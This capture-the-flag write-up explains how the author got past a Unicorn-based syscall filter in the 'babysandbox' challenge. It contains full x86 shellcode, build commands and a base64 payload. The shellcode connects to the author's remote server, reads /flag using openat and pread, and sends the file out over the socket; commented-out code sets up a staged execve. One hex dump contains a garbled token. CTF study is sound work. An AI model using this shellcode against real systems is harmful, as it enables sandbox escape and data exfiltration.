#### MeePWN CTF Quals 2018 - babysandbox (100)  - Pwn

##### Challenge

Do you know Unicorn engine? Let's bypass my baby sandbox   

http://178.128.100.75/



#### Summary

A web application which contains the web application source code, a binary and an input to send a *payload* to the binary.

![](https://unam.re/static/files/babysandbox_webApp.png)

From the web application we can download the binary, the exploitation of the binary is easy because it has a call <payload>, where payload is the user input.

So, the goal of this challenge is bypass the filter of the web application, basically, it is a python script which uses unicorn verify the syscalls that we are using in our payload. And It has forbidden the most common syscalls for shellcodes.

```Python
sys_fork = 2
sys_read = 3
sys_write = 4
sys_open = 5
sys_close = 6
sys_execve = 11
sys_access = 33
sys_dup	= 41
sys_dup2 = 63
sys_mmap = 90
sys_munmap = 91
sys_mprotect = 125
sys_sendfile = 187
sys_sendfile64 = 239
BADSYSCALL = [sys_fork, sys_read, sys_write, sys_open, sys_close, sys_execve, sys_access, sys_dup, sys_dup2, sys_mmap, sys_munmap, sys_mprotect, sys_sendfile, sys_sendfile64]
```

[source code](https://unam.re/static/files/babysandbox_source.py)

[binary](https://unam.re/static/files/babysandbox)



#### Solution

The solution is make a shellcode without uses the "BADSYSCALLS" and launch it though the web application.

Looking for syscalls that we can use in our payload, we found the following:

| Method        | System call  | Socket syscall           | Description  |
| ------------- |:-------------:| :--------------:|-----------:|
| socket        | 0x66 | 1 (SYS_SOCKET)          | Create a socket |
| connect | 0x66 |  3 (SYS_CONNECT)  | Connect a socket |
| send | 0x66 | 9 (SYS_SEND)  | Send data via socket |
| recv    | 0x66 | 10 (SYS_RECV)  | Receive data via socket |
| dup3     | 0x14a | None    |   Duplicate the file descriptors |
| openat | 0x127 | None | Open a file relative to a directory file descriptor |
| pread64 | 0xb4 | None | Read from or write to a file descriptor at a given offset |
| execve      | 0xb  | None    | It is forbidden by unicorn, but we will bypass it |



So, our purpose is make a shellcode which connect to our server and receive the execve syscall number (0xb) from the server, like a *staged* payload.

Moreover, as I like assembly programming, I have developed a little piece of code to read files using openat and pread. (Obviously with execve, I could do it as well...)

I have pieces of code commented because I changed the shellcode depending of the payload... (I don't know why execve(/bin/bash) doesn't work correctly :@ )

Finally, when I had my execve shellcode, I did a /bin/ls and I saw the flag in /flag. After, I read the file using openat and pread, and sent it via socket to my server.

```assembly
global _start			

section .text
_start:
        xor eax, eax
        xor ebx, ebx

        xor eax, eax
        xor ebx, ebx
        push eax                ; protocol      - 0
        push 1                  ; type          - SOCK_STREAM,
        push 2                  ; dominio       - AF_INET

        mov ecx, esp            ; arguments
        mov bl, 1               ; sys_socket (create)
        mov al, 102             ; systemcall
        int 0x80

        mov esi, eax            ; save sockfd

        xor ecx, ecx
        push 0x00000000         ; IP Address redacted
        push word 0xb315        ; Port 5555
        push word 2             ; PF_INET
        mov ecx, esp            ; save *addr in ecx

        push 0x10               ; length addrlen=16
        push ecx                ; &serv_addr
        push esi                ; sockfd

        mov ecx, esp            ; arguments
        mov al, 102             ; systemcall
        mov bl, 3               ; sys_connect
        int 0x80

        mov ebx, esi            ; oldfd = clientfd
        xor ecx, ecx            ; ecx = newfd      
        xor edx, edx
loop:
        mov ax, 0x14a
        int 0x80
        inc ecx
        cmp ecx, 0x2
        jle loop


		; sys_openat
		mov eax, 0x127
		xor ebx, ebx
		push ebx
		; openat /etc/passwd
		;push 0x64777373
		;push 0x61702f63
		;push 0x74652f2f	
		; openat /flag
		push 0x67616c66
		push 0x2f2f2f2f
		mov ecx, esp
		xor edx, edx
		xor esi, esi
		int 0x80
		
		; sys_pread(fd, buff,...)
		mov ebx, 0x4
		mov eax, 0xb4
		mov ecx, esp			
		mov edx, -1
		xor esi, esi
		int 0x80

		; socketcall sys_send
		mov ebx, 9		;send msg
		; arguments
		xor eax, eax
		push eax
		push -1
		push ecx
		push eax
		mov ecx, esp
		mov eax, 0x66
		int 0x80

		; Reveive execve and pwn! :)
		; sys_recv
		;xor eax, eax
		;mov ebx, esp
		;push eax
		;push 10
		;push ebx                ; file dir
		;push eax
		;mov ecx, esp
		;mov eax, 0x66
		;mov ebx, 10           ;recv msg
		;int 0x80

		;add ecx, 16
		;mov al, byte [ecx]		; 0xb
		;xor ecx, ecx
		;push ecx
		;push 0x736c2f6e
		;push 0x69622f2f
		;mov ebx, esp
		;push ecx
		;mov edx, esp
		;push ebx
		;mov ecx, esp
		;int 0x80
```



Compile the shellcode, encode to base64 and send via web application:

```bash
hiro@HackingLab:~/CTF/MeeCTF_2018$ nasm -f elf32 shellcode.asm -o shellcode.o
hiro@HackingLab:~/CTF/MeeCTF_2018$ ld shellcode.o -o shellcode
hiro@HackingLab:~/CTF/MeeCTF_2018$ objdump -d ./shellcode|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\xformato\x31\xc0\x31\xdb\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc6\x31\xc9\x68\xc1\xe9\x3c\x09\x66\x68\x15\xb3\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xb0\x66\xb3\x03\xcd\x80\x89\xf3\x31\xc9\x31\xd2\x66\xb8\x4a\x01\xcd\x80\x41\x83\xf9\x02\x7e\xf4\xb8\x27\x01\x00\x00\x31\xdb\x53\x68\x66\x6c\x61\x67\x68\x2f\x2f\x2f\x2f\x89\xe1\x31\xd2\x31\xf6\xcd\x80\xbb\x04\x00\x00\x00\xb8\xb4\x00\x00\x00\x89\xe1\xba\xff\xff\xff\xff\x31\xf6\xcd\x80\xbb\x09\x00\x00\x00\x31\xc0\x50\x6a\xff\x51\x50\x89\xe1\xb8\x66\x00\x00\x00\xcd\x80"
hiro@HackingLab:~/CTF/MeeCTF_2018$ python -c 'print "\x31\xc0\x31\xdb\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc6\x31\xc9\x68\xc1\xe9\x3c\x09\x66\x68\x15\xb3\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xb0\x66\xb3\x03\xcd\x80\x89\xf3\x31\xc9\x31\xd2\x66\xb8\x4a\x01\xcd\x80\x41\x83\xf9\x02\x7e\xf4\xb8\x27\x01\x00\x00\x31\xdb\x53\x68\x66\x6c\x61\x67\x68\x2f\x2f\x2f\x2f\x89\xe1\x31\xd2\x31\xf6\xcd\x80\xbb\x04\x00\x00\x00\xb8\xb4\x00\x00\x00\x89\xe1\xba\xff\xff\xff\xff\x31\xf6\xcd\x80\xbb\x09\x00\x00\x00\x31\xc0\x50\x6a\xff\x51\x50\x89\xe1\xb8\x66\x00\x00\x00\xcd\x80"' | base64
McAx2zHAMdtQagFqAonhswGwZs2AicYxyWjB6TwJZmgVs2ZqAonhahBRVonhsGazA82AifMxyTHS
ZrhKAc2AQYP5An70uCcBAAAx21NoZmxhZ2gvLy8vieEx0jH2zYC7BAAAALi0AAAAieG6/////zH2
zYC7CQAAADHAUGr/UVCJ4bhmAAAAzYAK
```



Reading arbitrary files:

![](https://unam.re/static/files/babysandbox_passwd.png)



Executing arbitrary code and reading /flag (test has "\xb"):

![](https://unam.re/static/files/babysandbox_flag.png)



(Yes, we read garbage from the stack too.. xD)

Flag:

```
MeePwnCTF{Unicorn_Engine_Is_So_Good_But_Not_Perfect}
```



Happy Hacking!! 
